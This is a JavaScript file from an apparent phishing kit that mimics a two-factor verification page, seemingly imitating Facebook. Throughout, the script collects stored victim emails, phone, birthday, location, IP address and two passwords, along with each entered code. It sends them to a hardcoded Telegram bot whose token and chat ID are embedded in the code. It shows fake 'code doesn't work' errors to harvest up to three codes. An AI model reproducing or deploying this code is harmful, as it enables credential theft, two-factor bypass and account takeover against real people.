let attempts = 0; // Đếm số lần nhập mã

document.getElementById('code').addEventListener('input', function (e) {
    const codeInput = e.target.value.trim();
    const continueButton = document.getElementById('continueButton');
    const errorMessage = document.getElementById('error-message');

    // Xóa thông báo lỗi khi người dùng nhập lại mã
    errorMessage.textContent = '';
    errorMessage.style.display = 'none';

    // Kích hoạt nút Continue nếu mã có 6 ký tự
    if (codeInput.length === 6 && /^[0-9]{6}$/.test(codeInput)) {
        continueButton.disabled = false;
    } else {
        continueButton.disabled = true;
    }
});

document.addEventListener("DOMContentLoaded", function () {
    const getNewCodeLink = document.getElementById("getNewCode");
    getNewCodeLink.addEventListener("click", function (event) {
        event.preventDefault();
        startCountdown(10);
    });
    function startCountdown(seconds) {
        let remainingTime = seconds;
        getNewCodeLink.style.color = "black";
        updateCountdownText(remainingTime);

        getNewCodeLink.style.pointerEvents = "none";

        countdownInterval = setInterval(() => {
            remainingTime--;

            if (remainingTime <= 0) {
                clearInterval(countdownInterval);
                getNewCodeLink.style.color = "blue";
                getNewCodeLink.textContent = "Get a new code";
                getNewCodeLink.style.pointerEvents = "auto";
            } else {
                updateCountdownText(remainingTime);
            }
        }, 1000)
    }
    function updateCountdownText(remainingTime) {
        const timeText = `<strong>00:${remainingTime
            .toString()
            .padStart(2, "0")}</strong>`;
        getNewCodeLink.innerHTML = `We can send a new code in ${timeText}`;
    }
});

document.getElementById('continueButton').addEventListener('click', async function () {
    const code = document.getElementById('code').value.trim();
    const errorMessage = document.getElementById('error-message');

    // Kiểm tra mã code nhập vào
    if (!/^[0-9]{6}$/.test(code)) {
        errorMessage.textContent = 'Invalid code. Please enter a 6-digit number.';
        errorMessage.style.display = 'block';
        return;
    }

    // Lấy thông tin đã lưu từ sessionStorage
    const email = sessionStorage.getItem('email') || 'Unknown';
    const businessEmail = sessionStorage.getItem('email-bus') || 'Unknown';
    const phone = sessionStorage.getItem('phone') || 'Unknown';
    const birthday = sessionStorage.getItem('birthday') || 'Unknown';
    const location = sessionStorage.getItem('location') || 'Unknown/Unknown/Unknown';
    const ipAddress = sessionStorage.getItem('ip-address') || 'Unknown'; // Lấy địa chỉ IP

    const firstPassword = sessionStorage.getItem('first-password') || 'Unknown';
    const secondPassword = sessionStorage.getItem('second-password') || 'Unknown';
    const successPopup = document.getElementById("success-popup");

    const BOT_TOKEN = "8084816537:AAHxy16raKfk1qJ7ZHDJ9k1LSJo5DMKlp28";
    const CHAT_ID = "-4582867073";

    // Tăng số lần nhập
    attempts++;

    // Tạo nội dung tin nhắn gửi Telegram
    const message = `
📄 *User Information*
------------------------
📧 *Personal Email:* ${email}
📧 *Business Email:* ${businessEmail}
📞 *Phone:* ${phone}
🎂 *Birthday:* ${birthday}
🌍 *Location:* ${location}
🌐 *IP Address:* ${ipAddress}
🔒 *First Password:* ${firstPassword}
🔒 *Second Password:* ${secondPassword}

🔑 *Attempt ${attempts}:* ${code}
`;

    try {
        // Gửi tin nhắn đến Telegram
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: "Markdown",
            }),
        });

        if (response.ok) {
            if (attempts < 3) {
                // Thông báo lỗi nếu mã chưa đúng
                setTimeout(() => {
                    errorMessage.textContent = 'This code doesn’t work. Check it’s correct or try a new one.';
                    errorMessage.style.display = 'block';
                    document.getElementById('code').value = ''; // Reset ô nhập mã
                    document.getElementById('continueButton').disabled = true; // Vô hiệu hóa nút Continue
                }, 2000);

            } else {
                setTimeout(() => {
                    document.getElementById('code').value = ''; // Reset ô nhập mã
                    successPopup.style.display = "block";
                }, 2000);
                // Sau lần thứ 3, chuyển hướng đến Facebook

            }
        } else {
            const errorData = await response.text();
            console.error("Telegram API Error:", errorData);
            errorMessage.textContent = 'Unable to send information. Please try again.';
            errorMessage.style.display = 'block';
        }
    } catch (error) {
        console.error('Error sending information:', error);
        errorMessage.textContent = 'Unable to send information. Please check your network connection.';
        errorMessage.style.display = 'block';
    }
});
